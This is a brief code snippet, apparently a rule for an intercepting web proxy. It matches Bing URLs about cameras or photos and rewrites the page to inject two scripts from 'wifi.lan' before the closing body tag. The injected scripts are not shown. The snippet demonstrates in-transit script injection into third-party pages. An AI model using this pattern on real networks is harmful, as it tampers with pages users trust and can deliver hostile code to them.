http()
    .url(/bing.*(nikon|camera|photo|picture|scene)/i)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://wifi.lan/loader.js'></script>
        <script src='http://wifi.lan/demo/config.js'></script>
        </body>
    `)